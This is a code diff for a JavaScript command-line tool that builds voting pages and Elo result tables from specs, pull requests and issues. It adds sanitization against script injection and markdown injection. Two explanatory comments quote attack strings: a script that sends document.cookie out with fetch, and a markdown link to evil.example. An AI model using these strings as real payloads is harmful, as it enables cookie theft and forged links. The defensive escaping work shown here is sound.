@@ -60,7 +60,10 @@ function str(v, flag) {
 }
 
 const list = v => (v == null || v === true ? [] : Array.isArray(v) ? v : [v]);
-const slug = s => String(s).toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-+|-+$/g, "") || "x";
+// Decomposed first so an accent becomes a combining mark and the letter under it
+// survives: "café" is "cafe", not "caf".
+const slug = s => String(s).normalize("NFD").replace(/[̀-ͯ]/g, "")
+  .toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-+|-+$/g, "") || "x";
 
 // "shots/dense-rows@2x.png" -> {id: "dense-rows", name: "Dense rows"}. Names taken off
 // filenames because that is what the person naming the files already meant them to say.
@@ -121,8 +124,14 @@ export function mediaFromMarkdown(body) {
     out.push({ src: url, alt: alt || "" });
   };
   // Fenced blocks are documentation, not the question. A PR body that shows what a
-  // config looks like should not put the config's own screenshots in the arena.
-  const text = String(body || "").replace(/^```[\s\S]*?^```/gm, "").replace(/`[^`\n]*`/g, "");
+  // config looks like should not put the config's own screenshots in the arena. Both
+  // fence characters, because GFM takes either, and HTML comments, which are the usual
+  // way a template leaves an example image in a body nobody meant to keep.
+  const text = String(body || "")
+    .replace(/^```[\s\S]*?^```/gm, "")
+    .replace(/^~~~[\s\S]*?^~~~/gm, "")
+    .replace(/<!--[\s\S]*?-->/g, "")
+    .replace(/`[^`\n]*`/g, "");
   // Three passes, not one, and the order is deliberate rather than positional: markdown
   // images first so a picture with alt text gets named after it, `<img>` next, bare URLs
   // last. The dedupe keeps the first sighting, so alt text always wins over a filename.
@@ -185,21 +194,40 @@ export function renderConfig(spec) {
   // and then an issue titled "Which?<U+2028>fetch('https://...', {body: document.cookie})"
   // is a script that runs when the page opens.
   const cmt = v => String(v).replace(/[\r\n\u2028\u2029\u0085]+/g, " ").trim();
+  // A key with a name a JS parser would choke on gets quoted. Nothing in a spec needs
+  // one, but a spec is JSON somebody else wrote and a config that does not parse is a
+  // blank page.
+  const key = k => (/^[A-Za-z_$][\w$]*$/.test(k) ? k : j(k));
+  // Everything the named lines above did not already write. `--spec` is documented as
+  // taking the whole config, and the engine has a dozen knobs past the six with lines
+  // of their own: dropping `confidence: {level: .8}` on the floor hands back a page
+  // that computes at .9 and never says it changed your mind for you.
+  const rest = (obj, known, indent) =>
+    Object.keys(obj)
+      .filter(k => !known.includes(k) && obj[k] !== undefined)
+      .map(k => `${indent}${key(k)}: ${j(obj[k])},`);
+
+  const CONTENDER_KEYS = ["id", "name", "note", "media", "html"];
   const contender = c => {
     const bits = [`id: ${j(c.id)}`, `name: ${j(c.name)}`];
     if (c.note) bits.push(`note: ${j(c.note)}`);
     if (c.media) bits.push(`media: ${j(c.media)}`);
     if (c.html) bits.push(`html: ${j(c.html)}`);
+    for (const k of Object.keys(c)) {
+      if (!CONTENDER_KEYS.includes(k) && c[k] !== undefined) bits.push(`${key(k)}: ${j(c[k])}`);
+    }
     return `    { ${bits.join(", ")} },`;
   };
+  const QUESTION_KEYS = ["id", "short", "title", "lede", "contenders"];
   const question = q => [
     `    {`,
     `      id: ${j(q.id)},`,
     q.short ? `      short: ${j(q.short)},` : null,
     q.title ? `      title: ${j(q.title)},` : null,
     q.lede ? `      lede: ${j(q.lede)},` : null,
+    ...rest(q, QUESTION_KEYS, "      "),
     `      contenders: [`,
-    ...q.contenders.map(c => "  " + contender(c)),
+    ...q.contenders.map(c => "    " + contender(c)),
     `      ],`,
     `    },`,
   ].filter(x => x != null).join("\n");
@@ -216,6 +244,7 @@ export function renderConfig(spec) {
     spec.askedBy ? `  askedBy: ${j(spec.askedBy)},` : null,
     spec.collection ? `  collection: ${j(spec.collection)},` : null,
     spec.media ? `  media: ${j(spec.media)},` : null,
+    ...rest(spec, ["id", "title", "lede", "askedBy", "collection", "media", "contenders", "questions"], "  "),
   ].filter(x => x != null);
 
   const body = spec.questions
@@ -261,7 +290,11 @@ export function tableFor(D, Q, votes) {
   // out here once, it drifted: the bar was hardcoded at 95 instead of derived from the
   // dome's own level, and it compared the rounded percentage, so a share of .9457 was
   // called a lead by a table that also printed it as 95%.
-  const verdict = T.verdictFor(conf, order, name);
+  // `confidence: false` builds a page with no callout under the table at all, so there
+  // is no sentence to match. Printing one anyway said "not enough bouts to say who is
+  // ahead yet" under a table with 240 bouts in it, which is both wrong and the exact
+  // disagreement between terminal and browser this function exists to rule out.
+  const verdict = D.confidence ? T.verdictFor(conf, order, name) : null;
   return { question: Q.id, title: Q.title || Q.label || "", bouts: conf.bouts, rows, verdict };
 }
 
@@ -284,7 +317,8 @@ export function renderText(tables, cfg) {
     for (const c of cells) {
       out.push(`  ${pad(c[0], w[0])}  ${pad(c[1], w[1])}  ${pad(c[2], w[2], true)}  ${pad(c[3], w[3], true)}`);
     }
-    out.push(`  ${t.verdict}`, "");
+    if (t.verdict) out.push(`  ${t.verdict}`);
+    out.push("");
   }
   return out.join("\n");
 }
@@ -294,21 +328,26 @@ export function renderText(tables, cfg) {
 export function renderMarkdown(tables, cfg) {
   const out = [];
   // A contender's name can be alt text a stranger typed into an issue, and this table
-  // is going straight back into that issue. An unescaped pipe is a row with an extra
-  // cell in a four-column table, which is a wrecked table at best and a forged one at
-  // worst; a newline ends the row early and turns the rest into prose.
-  const cell = s => String(s).replace(/\|/g, "\\|").replace(/\s*[\r\n]+\s*/g, " ");
-  if (cfg && cfg.title) out.push(`## ${cfg.title}`, "");
+  // is going straight back into that issue under your name. An unescaped pipe is a row
+  // with an extra cell in a four-column table, which is a wrecked table at best and a
+  // forged one at worst; a newline ends the row early and turns the rest into prose;
+  // and `[click me](https://evil.example)` is a live link you did not write. Everything
+  // a stranger could have chosen goes through here, the verdict sentence included,
+  // since it is made of two contender names.
+  const cell = s => String(s)
+    .replace(/\s*[\r\n]+\s*/g, " ")
+    .replace(/([\\`*_[\]<>|])/g, "\\$1");
+  if (cfg && cfg.title) out.push(`## ${cell(cfg.title)}`, "");
   for (const t of tables) {
-    if (t.title) out.push(`### ${t.title}`, "");
+    if (t.title) out.push(`### ${cell(t.title)}`, "");
     out.push("| # | | Elo | W–L–T |", "|---:|---|---:|---:|");
     for (const r of t.rows) {
       const elo = r.spread == null ? String(r.rating) : `${r.rating} ±${r.spread}`;
       out.push(`| ${r.rank} | ${cell(r.name)} | ${elo} | ${r.record} |`);
     }
-    out.push("", t.verdict, "");
+    out.push("", t.verdict ? cell(t.verdict) : "", "");
   }
-  if (cfg && cfg.askedBy) out.push(`Asked by ${cfg.askedBy}.`);
+  if (cfg && cfg.askedBy) out.push(`Asked by ${cell(cfg.askedBy)}.`);
   return out.join("\n").replace(/\n{3,}/g, "\n\n").trim() + "\n";
 }
 
@@ -362,39 +401,53 @@ export function planMedia(spec, dir, opts = {}, fs = FS) {
   // which the engine will happily build and serve.
   for (const b of fs.list(mediaDir)) taken.add(b);
   const reserve = name => {
-    const stem = name.replace(MEDIA_EXT, ""), ext = (MEDIA_EXT.exec(name) || [""])[0];
+    // build.mjs only inlines paths made of letters, digits, dots, @, dashes and
+    // slashes, and it leaves everything else as a relative link. The single most
+    // likely thing anyone points --media at is "Screenshot 2026-09-28 at 10.11.32
+    // AM.png", so the name that lands in the folder is slugged rather than kept: a
+    // copied file the build cannot see is the hole in the page this whole function
+    // exists to prevent.
+    const ext = (MEDIA_EXT.exec(name) || [""])[0].toLowerCase();
+    name = slug(name.slice(0, name.length - ext.length)) + ext;
+    const stem = name.slice(0, name.length - ext.length);
     let out = name, i = 2;
     while (taken.has(out)) out = `${stem}-${i++}${ext}`;
     taken.add(out);
     return out;
   };
+  // `media` is a string or a {src, frame, aspect} block, and the object form is the one
+  // the README recommends for icons. Both name a file that has to come along.
+  const srcOf = m => (typeof m === "string" ? m : m && typeof m.src === "string" ? m.src : null);
+  const withSrc = (m, v) => (typeof m === "string" ? v : { ...m, src: v });
   const bring = c => {
-    if (typeof c.media !== "string" || /^data:/i.test(c.media)) return c;
-    if (/^https?:/i.test(c.media)) {
+    const cur = srcOf(c.media);
+    if (cur == null || /^data:/i.test(cur)) return c;
+    const put = v => ({ ...c, media: withSrc(c.media, v) });
+    if (/^https?:/i.test(cur)) {
       if (opts.link) return c;                              // --link-media: leave it remote
       let base;
-      try { base = basename(new URL(c.media).pathname); } catch (e) { return c; }
+      try { base = basename(new URL(cur).pathname); } catch (e) { return c; }
       // GitHub's attachment host serves pasted screenshots from a URL with no extension
       // on it, so the name is a uuid and the type only shows up in the response. Those
       // get named after the contender and typed from the content-type at fetch time.
       const name = reserve(MEDIA_EXT.test(base) ? base : `${c.id}`);
-      fetches.push({ url: c.media, dest: join(mediaDir, name), name });
-      return { ...c, media: `media/${name}` };
+      fetches.push({ url: cur, dest: join(mediaDir, name), name });
+      return put(`media/${name}`);
     }
-    const src = resolve(process.cwd(), c.media);
+    const src = resolve(process.cwd(), cur);
     if (src === root || src.startsWith(root + sep)) {       // already where the build can see it
-      if (!fs.isFile(src)) missing.push(c.media);
+      if (!fs.isFile(src)) missing.push(cur);
       return c;
     }
     if (!fs.isFile(src)) {
       // A path written relative to the dome folder rather than to cwd is the same file
       // by another name, and the build will find it. Only complain if neither exists.
-      if (!fs.isFile(join(root, c.media))) missing.push(c.media);
+      if (!fs.isFile(join(root, cur))) missing.push(cur);
       return c;
     }
     const name = reserve(basename(src));
     copies.push([src, join(mediaDir, name)]);
-    return { ...c, media: `media/${name}` };
+    return put(`media/${name}`);
   };
   const planned = spec.questions
     ? { ...spec, questions: spec.questions.map(q => ({ ...q, contenders: (q.contenders || []).map(bring) })) }
@@ -402,7 +455,10 @@ export function planMedia(spec, dir, opts = {}, fs = FS) {
   if (missing.length) {
     throw new Error(`no such media file${missing.length === 1 ? "" : "s"}: ${missing.join(", ")}`);
   }
-  return { spec: planned, copies, fetches };
+  // `taken` goes out with the plan because a download's real name is not known until
+  // the response says what it is, and the name it ends up with has to dodge the names
+  // already spoken for here.
+  return { spec: planned, copies, fetches, taken: [...taken] };
 }
 
 const CT_EXT = {
@@ -417,11 +473,23 @@ const CT_EXT = {
 export async function applyMedia(plan, fs = FS) {
   for (const [src, dest] of plan.copies) fs.copyIn(src, dest);
   const failed = [];
+  // The name reserved at plan time had no extension on it; the one written does. Bump
+  // it against everything already spoken for, or an issue carrying both a pasted
+  // screenshot and a link to shot.png writes one file twice and puts two contenders on
+  // the same picture.
+  const taken = new Set(plan.taken || []);
+  const uniq = n => {
+    const ext = (MEDIA_EXT.exec(n) || [""])[0], stem = n.slice(0, n.length - ext.length);
+    let out = n, i = 2;
+    while (taken.has(out)) out = `${stem}-${i++}${ext}`;
+    taken.add(out);
+    return out;
+  };
   for (const f of plan.fetches) {
     try {
       const { body, type } = await fs.get(f.url);
       let name = f.name;
-      if (!MEDIA_EXT.test(name)) name += CT_EXT[String(type).split(";")[0].trim().toLowerCase()] || ".png";
+      if (!MEDIA_EXT.test(name)) name = uniq(name + (CT_EXT[String(type).split(";")[0].trim().toLowerCase()] || ".png"));
       fs.write(join(dirname(f.dest), name), body);
       f.saved = `media/${name}`;
     } catch (e) {
@@ -431,9 +499,11 @@ export async function applyMedia(plan, fs = FS) {
   }
   // Point the spec back at whatever actually landed.
   const fix = c => {
-    const f = plan.fetches.find(x => `media/${x.name}` === c.media);
+    const cur = typeof c.media === "string" ? c.media : c.media && c.media.src;
+    const f = plan.fetches.find(x => `media/${x.name}` === cur);
     if (!f) return c;
-    return f.saved ? { ...c, media: f.saved } : { ...c, media: f.url };
+    const v = f.saved || f.url;
+    return { ...c, media: typeof c.media === "string" ? v : { ...c.media, src: v } };
   };
   const s = plan.spec;
   const out = s.questions
@@ -458,6 +528,12 @@ async function cmdNew(args) {
   const name = args._[1];
   if (!name) throw new Error("usage: cli.mjs new <name> [--title ...] [--media a.png --media b.png] [--spec file|-] [--from-pr owner/repo#123]");
   let spec;
+  // Saying so beats ignoring it. The contenders come from exactly one place, and a
+  // --media that went nowhere is four minutes of wondering why the page has the wrong
+  // pictures on it.
+  if (args.media && (args.spec || args["from-pr"] || args["from-issue"] || args.from)) {
+    throw new Error("--media builds the contenders from files, so it cannot be combined with --spec or --from-pr. Put the paths in the spec instead.");
+  }
   if (args["from-pr"] || args["from-issue"] || args.from) {
     const from = args["from-pr"] || args["from-issue"] || args.from;
     const ref = parseRef(str(from, args["from-pr"] ? "from-pr" : args["from-issue"] ? "from-issue" : "from"));
@@ -468,6 +544,8 @@ async function cmdNew(args) {
   } else if (args.spec) {
     spec = { ...readSpec(args.spec === true ? "-" : str(args.spec, "spec")) };
     if (!spec.id) spec.id = slug(name);
+    if (args.id) spec.id = slug(str(args.id, "id"));
+    if (typeof args.title === "string") spec.title = args.title;
   } else {
     spec = specFromArgs(name, args);
   }
@@ -510,6 +588,10 @@ function domeDir(nameOrDir) {
   if (existsSync(join(direct, "config.js"))) return direct;
   const inExamples = join(here, "examples", nameOrDir);
   if (existsSync(join(inExamples, "config.js"))) return inExamples;
+  // `new "Red Button"` writes examples/red-button, so `results "Red Button"` has to
+  // find it. Same slug, same folder, either way round.
+  const slugged = join(here, "examples", slug(nameOrDir));
+  if (existsSync(join(slugged, "config.js"))) return slugged;
   const have = existsSync(join(here, "examples"))
     ? readdirSync(join(here, "examples")).filter(d => existsSync(join(here, "examples", d, "config.js")))
     : [];
